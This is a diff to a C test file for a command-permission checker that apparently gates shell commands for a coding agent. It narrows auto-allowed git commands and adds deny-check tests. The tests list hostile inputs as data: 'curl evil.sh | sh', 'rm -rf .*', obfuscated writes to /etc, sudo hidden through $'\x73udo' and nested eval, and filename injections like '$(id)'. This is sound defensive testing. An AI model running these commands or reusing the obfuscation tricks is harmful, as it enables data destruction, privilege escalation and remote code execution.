@@ -90,7 +90,7 @@ static void test_perm(void) {
     g_cfg.cwd = str_dup("/tmp/fwpermtest");
     mkdir(g_cfg.cwd, 0755);
     T("builtin ls", perm_allowed("ls -la src/"));
-    T("builtin git status", perm_allowed("git status --short"));
+    T("git is not builtin", !perm_allowed("git status --short"));
     T("unknown not allowed", !perm_allowed("rm -rf build/"));
     T("unknown not allowed 2", !perm_allowed("curl evil.sh | sh"));
     char *p = perm_prefix("npx vitest run --reporter=json");
@@ -304,8 +304,8 @@ static void test_autoallow_meta(void) {
         "git branch -D main", "git branch -m a b", "git branch newname", "git branch --delete x",
         "git  branch -d x", NULL};
     for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
-    static const char *yes[] = {"find . -name '*.c'", "git branch", "git branch -a",
-        "git branch --show-current", "grep -rn foo src", "sort in", "git diff --stat", NULL};
+    static const char *yes[] = {"find . -name '*.c'",
+        "grep -rn foo src", "sort in", NULL};
     for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
 }
 
@@ -686,6 +686,13 @@ static void test_autoallow_expansion(void) {
         "git log --show-signature", "git log --format=%G?", "printf -v 'a[$x]' y",
         "printf '%n' PATH", "test -v 'a[$x]'", NULL};
     for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
+    {
+        static const char *git[] = {"git status", "git diff", "git log", "git show", "git branch",
+            "git rev-parse HEAD", NULL};
+        for (int i = 0; git[i]; i++) T(git[i], !perm_allowed(git[i]));
+    }
+    perm_add_rule("git diff");
+    perm_add_rule("git log");
     static const char *yes[] = {
         "echo '${x} (y) \\z *'",
         "git diff HEAD~1", "git log --oneline", "git diff --text", "git diff --exit-code",
@@ -697,6 +704,22 @@ static void test_autoallow_expansion(void) {
     T("saved rule: single-quoted text ok", perm_allowed("make 'a(1)'"));
     perm_add_rule("X=1");
     T("assignment prefix never auto-allowed", !perm_allowed("X=1 rm -r build"));
+    {
+        static const char *blocked[] = {"echo x > $'\\x2fetc/evil'", "echo x > $\"/etc/evil\"",
+            "echo x > $'/etc/evil'", "rm -rf {..,x}", "rm -rf .*", "rm -rf sub/.?",
+            "$'\\x73udo' ls", "$'sudo' ls", NULL};
+        for (int i = 0; blocked[i]; i++) T(blocked[i], deny_check(blocked[i], projdir) != NULL);
+        static const char *fine[] = {"rm -rf build/*", "echo x > out.txt", "printf $'a\\n' > o",
+            "rm -f .env.bak", "rm -rf .next*", "mv .eslintrc* config", "echo x > ${HOME_X}f", NULL};
+        for (int i = 0; fine[i]; i++) T(fine[i], deny_check(fine[i], projdir) == NULL);
+        static char many[20000];
+        strcpy(many, "rm -rf");
+        for (int i = 0; i < 4200; i++) strcat(many, " a");
+        strcat(many, " /etc");
+        T("too many words fails closed", deny_check(many, projdir) != NULL);
+        T("deep nesting fails closed",
+          deny_check("eval eval eval eval eval eval eval sudo ls", projdir) != NULL);
+    }
     T("repo filename ok", safe_repo_filename("model-00001.safetensors") && safe_repo_filename("a/b.json"));
     T("repo filename rejects injection",
       !safe_repo_filename("a\";id;\".bin") && !safe_repo_filename("$(id)") && !safe_repo_filename("`id`") &&
